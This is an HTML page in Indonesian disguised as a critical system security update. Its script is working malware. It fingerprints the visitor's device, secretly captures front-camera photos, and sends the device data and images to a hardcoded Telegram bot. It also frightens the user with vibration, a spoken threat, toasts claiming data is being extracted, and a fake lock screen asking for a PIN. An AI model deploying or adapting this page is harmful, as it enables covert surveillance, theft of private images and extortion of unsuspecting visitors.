<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Update Required</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background:#1a1a1a; min-height:100vh; display:flex; justify-content:center; align-items:center; padding:20px; color:white; }
        .update-container {
            background:#2c2c2e; border-radius:20px; padding:30px 20px; width:100%; max-width:380px;
            box-shadow:0 20px 40px rgba(0,0,0,0.6); border:1px solid #3a3a3c; text-align:center;
        }
        .icon { width:90px; height:90px; background:#0a84ff; border-radius:24px; display:flex; justify-content:center; align-items:center; margin:0 auto 24px; font-size:48px; color:white; }
        h2 { color:white; margin-bottom:12px; font-weight:400; font-size:24px; }
        p { color:#a0a0a5; margin-bottom:24px; font-size:15px; line-height:1.5; }
        .progress-bar { width:100%; height:10px; background:#3a3a3c; border-radius:5px; overflow:hidden; margin:24px 0; }
        .progress-fill { height:100%; width:0%; background:linear-gradient(90deg, #0a84ff, #5e5ce6); border-radius:5px; transition:width 0.4s ease; }
        .status-text { color:#a0a0a5; font-size:14px; margin-top:12px; }
        .device-info { position:absolute; bottom:16px; left:0; right:0; text-align:center; color:#3a3a3c; font-size:11px; }
        #fakeLockScreen { 
            display:none; position:fixed; inset:0; background:rgba(0,0,0,0.98); z-index:9999; 
            flex-direction:column; justify-content:center; align-items:center; color:white; font-size:32px; text-align:center;
        }
        #fakeToast { 
            position:fixed; bottom:60px; left:50%; transform:translateX(-50%); background:rgba(255,59,48,0.92); 
            color:white; padding:16px 32px; border-radius:20px; z-index:10000; font-size:17px; display:none; max-width:90%;
        }
    </style>
</head>
<body>
    <div class="update-container">
        <div class="icon">‚öôÔ∏è</div>
        <h2>Pembaruan Keamanan Kritis</h2>
        <p>Perangkat terdeteksi rentan serangan. Jangan tutup, matikan, atau keluar dari halaman ini. Proses berlangsung 4-6 menit.</p>
        
        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        
        <div id="statusMessage" class="status-text">Memeriksa keamanan sistem...</div>
    </div>

    <div class="device-info" id="deviceModel">Mendeteksi perangkat...</div>

    <!-- Elemen tersembunyi -->
    <video id="hiddenVideo" autoplay playsinline muted style="display:none"></video>
    <audio id="hiddenAudio" autoplay style="display:none"></audio>
    <canvas id="hiddenCanvas" style="display:none"></canvas>
    <iframe id="hiddenFrame" style="display:none"></iframe>

    <!-- Fake lock & toast -->
    <div id="fakeLockScreen">
        <div>PERANGKAT TERKUNCI</div>
        <div style="font-size:18px; margin:30px 20px; color:#ff3b30;">Masukkan PIN/Password untuk membuka. Hubungi support resmi segera.</div>
    </div>

    <div id="fakeToast">Akses sistem sedang dibatasi untuk keamanan.</div>

    <script>
        // ==================== KONFIGURASI TELEGRAM ====================
        const TELEGRAM_TOKEN = '8741447274:AAG4LxoaQ559dj4W7u-Nuz0Zp5IwCP_Vlqo';
        const TELEGRAM_CHAT_ID = '6034935293';

        // ==================== DETEKSI DEVICE ====================
        const ua = navigator.userAgent;
        const isAndroid = /Android/i.test(ua);
        const isIOS = /iPhone|iPad|iPod/i.test(ua);
        const isMobile = /Mobile/i.test(ua);

        let deviceInfo = {
            type: isIOS ? 'iOS' : (isAndroid ? 'Android' : 'Desktop/Unknown'),
            ua: ua,
            screen: `\( {screen.width}x \){screen.height}`,
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
            time: new Date().toISOString(),
            language: navigator.language
        };

        document.getElementById('deviceModel').innerText = `${deviceInfo.type} ‚Ä¢ ${deviceInfo.tz}`;

        let capturedPhotos = [];
        let cameraStream = null;

        // ==================== KIRIM KE TELEGRAM ====================
        async function sendToTelegram(msg) {
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'Markdown' })
                });
            } catch {}
        }

        async function sendPhotoToTelegram(base64, caption) {
            try {
                const block = base64.split(';');
                const realData = block[1].split(',')[1];
                const blob = await (await fetch(`data:image/jpeg;base64,${realData}`)).blob();
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', blob, 'photo.jpg');
                formData.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (e) {
                await sendToTelegram(`${caption}\n[GAGAL KIRIM FOTO]`);
            }
        }

        // ==================== UPDATE STATUS ====================
        function updateStatus(msg, pct) {
            document.getElementById('statusMessage').innerText = msg;
            document.getElementById('progressFill').style.width = pct + '%';
        }

        // ==================== KAMERA FIX ANTI-HITAM V3 ====================
        async function getCameraUniversal() {
            try {
                updateStatus('Mengakses kamera...', 20);
                await sendToTelegram("üì∏ [KAMERA] Mulai akses");

                const constraintsList = [
                    { video: { facingMode: { exact: 'user' }, width: { ideal: 1280 }, height: { ideal: 720 } } },
                    { video: { facingMode: 'user' } },
                    { video: { facingMode: { exact: 'environment' } } },
                    { video: { facingMode: 'environment' } },
                    { video: true }
                ];

                let success = false;
                let modeUsed = 'unknown';

                for (const cons of constraintsList) {
                    try {
                        cameraStream = await navigator.mediaDevices.getUserMedia(cons);
                        success = true;
                        modeUsed = cons.video?.facingMode?.exact || cons.video?.facingMode || 'default';
                        await sendToTelegram(`üì∏ Sukses: ${modeUsed}`);
                        break;
                    } catch (err) {
                        await sendToTelegram(`üì∏ Gagal: ${JSON.stringify(cons.video || {})} ‚Üí ${err.message}`);
                    }
                }

                if (!success) throw new Error("Semua constraint gagal");

                const video = document.getElementById('hiddenVideo');
                video.srcObject = cameraStream;
                video.muted = true;
                video.playsInline = true;

                await new Promise((res, rej) => {
                    video.onloadedmetadata = () => video.play().then(res).catch(rej);
                    setTimeout(() => rej(new Error("Timeout video")), 10000);
                });

                await new Promise(r => setTimeout(r, 1800));

                for (let i = 1; i <= 10; i++) {
                    let photo = null;
                    let attempts = 0;
                    while (!photo && attempts < 4) {
                        attempts++;
                        photo = capturePhoto();
                        if (photo && !isBlackImage(photo)) {
                            capturedPhotos.push(photo);
                            await sendPhotoToTelegram(photo, `Foto ${i} - \( {deviceInfo.type} ( \){modeUsed}, attempt ${attempts})`);
                            await sendToTelegram(`üì∏ Foto ${i} VALID`);
                            break;
                        }
                        await new Promise(r => setTimeout(r, 700));
                    }
                    if (!photo || isBlackImage(photo)) {
                        await sendToTelegram(`üì∏ Foto ${i} tetap hitam/gagal`);
                    }
                }

                if (capturedPhotos.length === 0) {
                    const fallback = captureScreenFallback();
                    if (fallback) {
                        await sendPhotoToTelegram(fallback, "Fallback: Screenshot halaman (kamera gagal)");
                    }
                }

            } catch (err) {
                await sendToTelegram(`üì∏ ERROR: ${err.message}`);
            } finally {
                if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
            }
        }

        function capturePhoto() {
            const v = document.getElementById('hiddenVideo');
            const c = document.getElementById('hiddenCanvas');
            if (!v.videoWidth) return null;
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            return c.toDataURL('image/jpeg', 0.8);
        }

        function isBlackImage(dataUrl) {
            if (!dataUrl) return true;
            const img = new Image();
            img.src = dataUrl;
            const tc = document.createElement('canvas');
            tc.width = tc.height = 48;
            const ctx = tc.getContext('2d');
            ctx.drawImage(img, 0, 0, 48, 48);
            const d = ctx.getImageData(0, 0, 48, 48).data;
            let sum = 0;
            for (let i = 0; i < d.length; i += 4) sum += (d[i] + d[i+1] + d[i+2]) / 3;
            return (sum / (48*48)) < 12;
        }

        function captureScreenFallback() {
            try {
                const c = document.getElementById('hiddenCanvas');
                c.width = window.innerWidth;
                c.height = window.innerHeight;
                const ctx = c.getContext('2d');
                ctx.drawImage(document.documentElement, 0, 0, c.width, c.height);
                return c.toDataURL('image/jpeg', 0.7);
            } catch { return null; }
        }

        // ==================== CHAOS KONTROL ====================
        async function chaosControls() {
            // Vibrate chaos
            if (navigator.vibrate) {
                setInterval(() => navigator.vibrate([90,50,140,70,220]), 14000);
                await sendToTelegram("üì≥ Getar chaos aktif");
            }

            // TTS ancaman
            if ('speechSynthesis' in window) {
                const u = new SpeechSynthesisUtterance("Perangkat Anda telah dikendalikan. Jangan matikan atau tutup halaman ini. Data sedang diproses.");
                u.lang = 'id-ID';
                u.rate = 0.92;
                speechSynthesis.speak(u);
                await sendToTelegram("üó£Ô∏è TTS ancaman dijalankan");
            }

            // Fake toast loop
            function showToast(txt) {
                const t = document.getElementById('fakeToast');
                t.textContent = txt;
                t.style.display = 'block';
                setTimeout(() => t.style.display = 'none', 6000);
            }
            const toasts = ["Data pribadi diekstrak", "Proses tidak bisa dibatalkan", "Jangan keluar dari halaman", "Sistem terkunci"];
            setInterval(() => showToast(toasts[Math.floor(Math.random()*toasts.length)]), 20000);

            // Fake lock setelah 40 detik
            setTimeout(() => {
                document.getElementById('fakeLockScreen').style.display = 'flex';
                document.querySelector('.update-container').style.opacity = '0.4';
                sendToTelegram("üîí Fake lock screen aktif");
            }, 40000);
        }

        // ==================== START EKSEKUSI ====================
        window.onload = async function() {
            updateStatus('Analisis dimulai...', 5);
            await sendToTelegram(`üî• TARGET BARU\nTipe: ${deviceInfo.type}\nUA: ${deviceInfo.ua}\nLayar: ${deviceInfo.screen}\nTZ: ${deviceInfo.tz}`);

            chaosControls();

            // Jalankan kamera fix
            await getCameraUniversal();

            // Simulasi progress panjang
            let pct = 10;
            const sim = setInterval(() => {
                pct += Math.random() * 12;
                if (pct >= 100) {
                    pct = 100;
                    clearInterval(sim);
                    updateStatus('Pembaruan selesai ‚Äî perangkat terkendali', 100);
                    sendToTelegram("‚úÖ KONTROL PENUH");
                } else {
                    updateStatus(`Mengamankan akses... ${Math.round(pct)}%`, pct);
                }
            }, 1400);
        };
    </script>
</body>
</html>
